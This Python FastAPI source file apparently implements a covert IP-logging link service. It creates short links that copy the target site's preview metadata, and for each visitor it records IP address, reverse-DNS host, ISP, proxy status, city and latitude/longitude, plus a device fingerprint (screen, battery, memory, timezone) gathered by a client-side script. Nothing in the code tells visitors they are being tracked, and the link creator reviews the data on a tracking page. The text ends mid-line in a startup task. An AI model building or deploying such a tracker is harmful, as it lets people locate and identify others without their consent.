from fastapi import FastAPI, Request, Form, Header, HTTPException
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

import sqlite3
import string
import random
import asyncio
from datetime import datetime
import socket
import os

import httpx
from bs4 import BeautifulSoup
from user_agents import parse as ua_parse  # pip install user-agents

# Environment config
BITLY_TOKEN = os.getenv("BITLY_TOKEN")

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

DB_PATH = "links.db"
SERVICE_URL = "https://q3os-yn89.onrender.com"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # links table
    c.execute("""
    CREATE TABLE IF NOT EXISTS links (
      id INTEGER PRIMARY KEY,
      code TEXT UNIQUE,
      target TEXT,
      created_at TEXT,
      og_title TEXT,
      og_description TEXT,
      og_image TEXT,
      capture_ip INTEGER DEFAULT 0,
      capture_host INTEGER DEFAULT 0,
      capture_provider INTEGER DEFAULT 0,
      capture_proxy INTEGER DEFAULT 0,
      capture_continent INTEGER DEFAULT 0,
      capture_country INTEGER DEFAULT 0,
      capture_region INTEGER DEFAULT 0,
      capture_city INTEGER DEFAULT 0,
      capture_latlong INTEGER DEFAULT 0,
      capture_browser INTEGER DEFAULT 0,
      capture_os INTEGER DEFAULT 0,
      capture_user_agent INTEGER DEFAULT 0,
      capture_language INTEGER DEFAULT 0,
      capture_platform INTEGER DEFAULT 0,
      capture_cookies INTEGER DEFAULT 0,
      capture_screen_width INTEGER DEFAULT 0,
      capture_screen_height INTEGER DEFAULT 0,
      capture_viewport_width INTEGER DEFAULT 0,
      capture_viewport_height INTEGER DEFAULT 0,
      capture_color_depth INTEGER DEFAULT 0,
      capture_device_memory INTEGER DEFAULT 0,
      capture_hardware_concurrency INTEGER DEFAULT 0,
      capture_connection INTEGER DEFAULT 0,
      capture_battery INTEGER DEFAULT 0,
      capture_timezone INTEGER DEFAULT 0,
      capture_local_time INTEGER DEFAULT 0,
      capture_referrer INTEGER DEFAULT 0
    )
    """)

    # visits table
    c.execute("""
    CREATE TABLE IF NOT EXISTS visits (
      id INTEGER PRIMARY KEY,
      link_id INTEGER,
      ip TEXT,
      host TEXT,
      provider TEXT,
      proxy TEXT,
      continent TEXT,
      country TEXT,
      region TEXT,
      city TEXT,
      latlong TEXT,
      browser TEXT,
      os TEXT,
      user_agent TEXT,
      language TEXT,
      platform TEXT,
      cookies_enabled INTEGER,
      screen_width INTEGER,
      screen_height INTEGER,
      viewport_width INTEGER,
      viewport_height INTEGER,
      color_depth INTEGER,
      device_memory REAL,
      hardware_concurrency INTEGER,
      connection TEXT,
      battery_charging INTEGER,
      battery_level REAL,
      time_zone_offset INTEGER,
      local_time TEXT,
      referrer TEXT,
      timestamp TEXT
    )
    """)

    conn.commit()
    conn.close()

@app.on_event("startup")
async def startup():
    init_db()

def generate_code(length: int = 6) -> str:
    alphabet = string.ascii_letters + string.digits
    return ''.join(random.choices(alphabet, k=length))

async def shorten_with_tinyurl(url: str) -> str:
    api_url = f"http://tinyurl.com/api-create.php?url={url}"
    async with httpx.AsyncClient(timeout=5.0) as client:
        resp = await client.get(api_url)
        return resp.text if resp.status_code == 200 else url

async def shorten_with_bitly(url: str) -> str:
    if not BITLY_TOKEN:
        return url
    headers = {"Authorization": f"Bearer {BITLY_TOKEN}", "Content-Type": "application/json"}
    payload = {"long_url": url}
    async with httpx.AsyncClient(timeout=5.0) as client:
        resp = await client.post("https://api-ssl.bitly.com/v4/shorten", json=payload, headers=headers)
        if resp.status_code == 200:
            return resp.json().get("link", url)
    return url

@app.get("/", response_class=HTMLResponse)
async def read_root(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/create", response_class=HTMLResponse)
async def create_link(
    request: Request,
    target_url: str = Form(...),
    shortener: str  = Form(...),
    capture_ip: str = Form(None),
    capture_host: str = Form(None),
    capture_provider: str = Form(None),
    capture_proxy: str = Form(None),
    capture_continent: str = Form(None),
    capture_country: str = Form(None),
    capture_region: str = Form(None),
    capture_city: str = Form(None),
    capture_latlong: str = Form(None),
    capture_browser: str = Form(None),
    capture_os: str = Form(None),
    capture_user_agent: str = Form(None),
    capture_language: str = Form(None),
    capture_platform: str = Form(None),
    capture_cookies: str = Form(None),
    capture_screen_width: str = Form(None),
    capture_screen_height: str = Form(None),
    capture_viewport_width: str = Form(None),
    capture_viewport_height: str = Form(None),
    capture_color_depth: str = Form(None),
    capture_device_memory: str = Form(None),
    capture_hardware_concurrency: str = Form(None),
    capture_connection: str = Form(None),
    capture_battery: str = Form(None),
    capture_timezone: str = Form(None),
    capture_local_time: str = Form(None),
    capture_referrer: str = Form(None),
):
    # choose or generate code
    if shortener == "random":
        code = generate_code()
    elif shortener in ("tinyurl", "bitly"):
        code = generate_code()
    else:
        code = shortener

    # fetch OpenGraph metadata
    og_title = og_description = og_image = ""
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            resp = await client.get(target_url)
            soup = BeautifulSoup(resp.text, "html.parser")
            def meta_prop(p):
                tag = soup.find("meta", property=p)
                return tag["content"] if tag and tag.has_attr("content") else ""
            og_title       = meta_prop("og:title")
            og_description = meta_prop("og:description")
            og_image       = meta_prop("og:image")
    except Exception:
        pass

    # build flags dict
    flags = {k: bool(v) for k, v in {
        'capture_ip': capture_ip,
        'capture_host': capture_host,
        'capture_provider': capture_provider,
        'capture_proxy': capture_proxy,
        'capture_continent': capture_continent,
        'capture_country': capture_country,
        'capture_region': capture_region,
        'capture_city': capture_city,
        'capture_latlong': capture_latlong,
        'capture_browser': capture_browser,
        'capture_os': capture_os,
        'capture_user_agent': capture_user_agent,
        'capture_language': capture_language,
        'capture_platform': capture_platform,
        'capture_cookies': capture_cookies,
        'capture_screen_width': capture_screen_width,
        'capture_screen_height': capture_screen_height,
        'capture_viewport_width': capture_viewport_width,
        'capture_viewport_height': capture_viewport_height,
        'capture_color_depth': capture_color_depth,
        'capture_device_memory': capture_device_memory,
        'capture_hardware_concurrency': capture_hardware_concurrency,
        'capture_connection': capture_connection,
        'capture_battery': capture_battery,
        'capture_timezone': capture_timezone,
        'capture_local_time': capture_local_time,
        'capture_referrer': capture_referrer
    }.items()}

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    created_at = datetime.utcnow().isoformat()

    cols = ", ".join(flags.keys())
    placeholders = ", ".join("?" for _ in flags)
    vals = [int(v) for v in flags.values()]

    try:
        c.execute(f"""
          INSERT INTO links
            (code, target, created_at, og_title, og_description, og_image, {cols})
          VALUES
            (?, ?, ?, ?, ?, ?, {placeholders})
        """, [code, target_url, created_at, og_title, og_description, og_image, *vals])
    except sqlite3.IntegrityError:
        code = generate_code()
        c.execute(f"""
          INSERT INTO links
            (code, target, created_at, og_title, og_description, og_image, {cols})
          VALUES
            (?, ?, ?, ?, ?, ?, {placeholders})
        """, [code, target_url, created_at, og_title, og_description, og_image, *vals])

    conn.commit()
    conn.close()

    link_url  = request.url_for("redirect_to_target", code=code)
    track_url = request.url_for("track", code=code)

    if shortener == "tinyurl":
        short_url = await shorten_with_tinyurl(link_url)
    elif shortener == "bitly":
        short_url = await shorten_with_bitly(link_url)
    else:
        short_url = link_url

    return templates.TemplateResponse("result.html", {
        "request": request,
        "link_url": link_url,
        "track_url": track_url,
        "short_url": short_url
    })

@app.get("/{code}", response_class=HTMLResponse)
async def redirect_to_target(
    request: Request,
    code: str,
    x_real_ip: str | None = Header(None),
    x_forwarded_for: str | None = Header(None)
):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
    SELECT
      id, target, og_title, og_description, og_image,
      capture_ip, capture_host, capture_provider, capture_proxy,
      capture_continent, capture_country, capture_region, capture_city, capture_latlong,
      capture_browser, capture_os, capture_user_agent, capture_language, capture_platform,
      capture_cookies, capture_screen_width, capture_screen_height, capture_viewport_width,
      capture_viewport_height, capture_color_depth, capture_device_memory, capture_hardware_concurrency,
      capture_connection, capture_battery, capture_timezone, capture_local_time, capture_referrer
    FROM links WHERE code=?
    """, (code,))
    row = c.fetchone()
    if not row:
        conn.close()
        raise HTTPException(404, "Link not found")

    (
      link_id, target, og_title, og_description, og_image,
      cap_ip, cap_host, cap_provider, cap_proxy,
      cap_continent, cap_country, cap_region, cap_city, cap_latlong,
      cap_browser, cap_os, cap_ua, cap_lang, cap_platform, cap_cookies,
      cap_sw, cap_sh, cap_vw, cap_vh, cap_cd,
      cap_dm, cap_hc, cap_conn, cap_batt, cap_tz, cap_lt, cap_referrer
    ) = row

    # determine IP
    if x_real_ip:
        ip = x_real_ip.strip()
    elif x_forwarded_for:
        ip = x_forwarded_for.split(",")[0].strip()
    else:
        ip = request.client.host or ""

    # parse UA
    ua_string = request.headers.get("user-agent", "")
    ua = ua_parse(ua_string)

    # resolve host
    host = ""
    if cap_host:
        try:
            host = socket.gethostbyaddr(ip)[0]
        except:
            host = ""

    # geolocation
    country = region = city = continent = provider = proxy = latlong = ""
    need_geo = any([
        cap_provider, cap_proxy, cap_continent,
        cap_country, cap_region, cap_city, cap_latlong
    ])
    if need_geo and ip:
        async with httpx.AsyncClient(timeout=5.0) as client:
            try:
                r = await client.get(f"https://ipapi.co/{ip}/json")
                data = r.json()
                if r.status_code != 200 or data.get("error"):
                    raise ValueError
            except:
                r2 = await client.get(
                  f"http://ip-api.com/json/{ip}"
                  "?fields=status,message,country,regionName,city,continent,org,proxy,lat,lon"
                )
                data = r2.json() if r2.status_code == 200 else {}
            if cap_provider:
                provider  = data.get("org","") or ""
            if cap_proxy:
                proxy     = str(data.get("proxy","")) or ""
            if cap_continent:
                continent = data.get("continent","") or ""
            if cap_country:
                country   = data.get("country_name","") or data.get("country","") or ""
            if cap_region:
                region    = data.get("region","") or data.get("regionName","") or ""
            if cap_city:
                city      = data.get("city","") or ""
            if cap_latlong:
                lat = data.get("latitude") or data.get("lat")
                lon = data.get("longitude") or data.get("lon")
                latlong = f"{lat},{lon}" if lat and lon else ""

    cookies_enabled = 1 if cap_cookies and "cookie" in request.headers else 0
    browser = f"{ua.browser.family} {'.'.join(str(x) for x in ua.browser.version)}".strip() if cap_browser else ""
    os_str  = f"{ua.os.family} {'.'.join(str(x) for x in ua.os.version)}".strip() if cap_os else ""
    timestamp = datetime.utcnow().isoformat()

    # initial visit insert with only IP/geo/browser/os/timestamp
    c.execute("""
      INSERT INTO visits
        (link_id, ip, host, provider, proxy, continent, country, region,
         city, latlong, browser, os, timestamp)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
      link_id, ip, host, provider, proxy, continent, country, region,
      city, latlong, browser, os_str, timestamp
    ))
    conn.commit()
    conn.close()

    return templates.TemplateResponse("redirect.html", {
      "request": request,
      "target": target,
      "og_title": og_title,
      "og_description": og_description,
      "og_image": og_image,
      "code": code,
      # these flags control which fields the client script emits
      "capture_user_agent": cap_ua,
      "capture_language": cap_lang,
      "capture_platform": cap_platform,
      "capture_cookies": cap_cookies,
      "capture_screen_width": cap_sw,
      "capture_screen_height": cap_sh,
      "capture_viewport_width": cap_vw,
      "capture_viewport_height": cap_vh,
      "capture_color_depth": cap_cd,
      "capture_device_memory": cap_dm,
      "capture_hardware_concurrency": cap_hc,
      "capture_connection": cap_conn,
      "capture_battery": cap_batt,
      "capture_timezone": cap_tz,
      "capture_local_time": cap_lt,
      "capture_referrer": cap_referrer
    })

@app.post("/collect")
async def collect_data(request: Request):
    data = await request.json()
    code = data.get("code")
    if not code:
        raise HTTPException(400, "Missing code")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    c.execute("SELECT MAX(id) FROM visits WHERE link_id=(SELECT id FROM links WHERE code=?)", (code,))
    visit_id = c.fetchone()[0]

    updates = []
    params = []
    allowed = [
      "user_agent","language","platform","cookies_enabled","screen_width","screen_height",
      "viewport_width","viewport_height","color_depth","device_memory","hardware_concurrency",
      "connection","battery_charging","battery_level","time_zone_offset","local_time","referrer"
    ]
    for field in allowed:
        if field in data:
            updates.append(f"{field}=?")
            params.append(data[field])

    if updates and visit_id:
        sql = f"UPDATE visits SET {', '.join(updates)} WHERE id=?"
        c.execute(sql, (*params, visit_id))
        conn.commit()

    conn.close()
    return {"status": "ok"}

@app.get("/track/{code}", response_class=HTMLResponse)
async def track(request: Request, code: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id FROM links WHERE code=?", (code,))
    row = c.fetchone()
    if not row:
        conn.close()
        raise HTTPException(404, "Link not found")
    link_id = row[0]

    c.execute("""
      SELECT
        ip, host, provider, proxy, continent, country, region, city, latlong,
        browser, os, user_agent, language, platform, cookies_enabled,
        screen_width, screen_height, viewport_width, viewport_height,
        color_depth, device_memory, hardware_concurrency,
        connection, battery_charging, battery_level,
        time_zone_offset, local_time, referrer, timestamp
      FROM visits
      WHERE link_id=?
      ORDER BY timestamp DESC
    """, (link_id,))
    visits = c.fetchall()
    conn.close()

    return templates.TemplateResponse(
      "track.html",
      {"request": request, "code": code, "visits": visits}
    )

@app.get("/api/visit-metadata/{code}")
async def visit_metadata(code: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM visits v JOIN links l ON v.link_id = l.id WHERE l.code = ?", (code,))
    count = c.fetchone()[0]
    conn.close()
    return {"count": count}

@app.get("/ping")
async def ping():
    return {"status": "alive"}

@app.on_event("startup")
async def schedule_ping_task():
    async def ping_loop():
        async with httpx.AsyncClient(timeout=5.0
